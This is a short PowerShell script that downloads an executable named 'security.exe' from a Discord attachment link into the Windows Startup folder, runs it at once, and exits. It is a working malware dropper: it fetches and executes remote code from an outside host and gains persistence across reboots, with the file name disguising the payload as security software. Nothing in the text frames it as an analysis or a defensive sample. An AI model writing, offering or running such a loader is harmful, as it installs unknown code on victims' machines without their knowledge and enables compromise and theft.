$startupFolder = [Environment]::GetFolderPath("Startup")
$url = "https://cdn.discordapp.com/attachments/1209633323912003637/1345433718365622295/security.exe?ex=67c4884b&is=67c336cb&hm=818e39b57e3684277db067c570fa1a0c4e721c1f9a2a79c498261c94843531fb&"
$outputPath = Join-Path $startupFolder "security.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath
& $startupFolder\security.exe
[System.Environment]::Exit(0)
